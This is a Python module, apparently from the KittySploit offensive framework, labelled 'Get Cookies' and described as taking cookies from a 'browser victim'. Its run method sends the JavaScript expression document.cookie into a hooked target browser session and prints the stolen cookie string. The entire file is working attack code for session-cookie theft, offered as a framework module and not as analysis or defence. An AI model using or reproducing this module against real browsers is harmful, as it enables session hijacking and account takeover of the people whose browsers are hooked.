from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Get Cookies",
		"description": "Get cookies from browser victim",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}	

	def run(self):
		"""Get cookies from the target browser session"""
		cookies = self.send_js_and_wait_for_response("document.cookie")
		if cookies:
			print_success(f"Cookies: {cookies}")
			return True
		else:
			print_error("Failed to retrieve cookies")
			return False
